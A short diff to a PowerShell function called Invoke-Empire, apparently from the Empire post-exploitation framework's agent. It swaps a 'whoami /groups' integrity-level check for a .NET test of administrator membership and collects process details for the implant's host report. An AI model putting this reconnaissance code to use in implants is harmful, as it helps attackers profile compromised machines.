@@ -219,7 +219,7 @@ function Invoke-Empire {
         }
         else{
             # otherwise check the groups
-            $str += '|'+($(whoami /groups) -join "").Contains("High Mandatory Level");
+            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
         }
         $n = [System.Diagnostics.Process]::GetCurrentProcess();
         $str += '|'+$n.ProcessName+'|'+$n.Id;
